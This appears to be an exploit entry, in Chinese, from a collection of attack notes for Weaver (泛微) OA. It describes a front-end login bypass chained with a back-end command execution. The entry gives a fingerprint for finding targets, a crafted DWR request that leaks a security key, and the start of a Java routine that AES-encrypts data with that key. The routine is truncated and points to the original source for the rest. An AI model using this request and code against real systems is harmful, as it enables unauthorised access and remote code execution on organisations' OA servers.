# 泛微OA前台登录绕过+后台组合拳RCE

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body = "/wui/common/css/w7OVFont_wev8.css"`
- **请求**：`POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1`

**请求体 / payload**
```
利用dwr/call接口读取key
Host:
其中security.key为 5f2f28dd-db4a-45
调用aes加密函数
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
publicclass Main {
public static String encrypt(String str, String str2) {
try {
KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
secureRandom.setSeed(str2.getBytes());
keyGenerator.init(128, secureRandom);
SecretKeySpec secretKeySpec = new SecretKeySpec(keyGenerator.generateK…（脚本共 3646 字，完整版见原文）
```
- **预期**：200　|　—